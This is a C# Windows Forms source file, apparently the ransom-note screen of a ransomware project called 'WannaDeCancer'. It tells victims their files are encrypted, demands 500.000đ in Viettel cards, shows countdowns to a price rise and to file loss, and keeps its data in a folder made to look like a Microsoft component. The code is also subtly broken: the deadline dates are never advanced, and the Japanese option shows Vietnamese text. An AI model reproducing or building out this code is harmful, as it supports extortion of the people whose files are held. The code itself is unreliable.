using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace WannaDeCancer
{
    public partial class GUIMain : Form
    {
        public GUIMain()
        {
            InitializeComponent();
            CustomInit();
        }

        private void CustomInit()
        {
            //Each time the combobox change value, trigger the Decription()
            Description();
            cbxLang.TextChanged += CbxLang_TextChanged;

            //Time
            DateTimeCalculate();
        }

        private void DateTimeCalculate()
        {
            //Check if the time information was created or not
            if (!File.Exists(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt"))
            {
                DateTime dt = DateTime.Now;
                string stream = "Start: " + dt + "\r\nRaise: ";
                dt.AddDays(3);
                stream += dt + "\r\nLost: ";
                dt.AddDays(4);
                stream += dt;
                Static.StringtoFile(stream, @"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt");
            }

            //Get the time information
            string getTime = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF);
            string[] split = getTime.Split('\r');

            for (int i = 1; i < split.Length; i++)
            {
                split[i].Substring(1);
            }
            lbRaiseExpired.Text = split[1].Substring(7);
            lbLostExpire.Text = split[2].Substring(7);
        }

        private void CbxLang_TextChanged(object sender, EventArgs e)
        {
            Description();
        }

        /// <summary>
        /// Change the txbDecription to desired Languges
        /// </summary>
        private void Description()
        {
            //Des
            switch (cbxLang.Text)
            {
                case "English":
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\EN.txt", EncodeType.UTF);
                    lbTitle.Text = "Oooops, your file has been encrypted!";
                    lbDesLost.Text = "Your File will lost on:";
                    lbDesRaise.Text = "Payment Will Raise on:";
                    lbDesTimeLeftRaise.Text = "Time Left:";
                    lbDesTimeLeftLost.Text = "Time Left: ";
                    lbSend.Text = "Send 500.000đ Viettel card include your decrypt id";
                    break;
                case "VN":
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\VI.txt", EncodeType.Unicode);
                    lbTitle.Text = "Ôiiiiiiiiiii! File của bạn đã bị mã hóa";
                    lbDesLost.Text = "File của bạn sẽ bị mất vào:";
                    lbDesRaise.Text = "Tăng giá vào:";
                    lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
                    lbDesTimeLeftLost.Text = "Thời gian còn lại: ";
                    lbSend.Text = "Gửi 500.000đ Thẻ Viettel bao gồm id giải mã hóa";
                    break;
                case "日本語":
                    //ko co wifi dich sau
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", EncodeType.Unicode);
                    lbTitle.Text = "Ôiiiiiiiiiii! File của bạn đã bị mã hóa";
                    lbDesLost.Text = "File của bạn sẽ bị mất vào:";
                    lbDesRaise.Text = "Tăng giá vào:";
                    lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
                    lbDesTimeLeftLost.Text = "Thời gian còn lại: ";
                    lbSend.Text = "Gửi 500.000đ Thẻ Viettel bao gồm id giải mã hóa";
                    break;
                default:
                    break;
            }
            


        }
    }
}
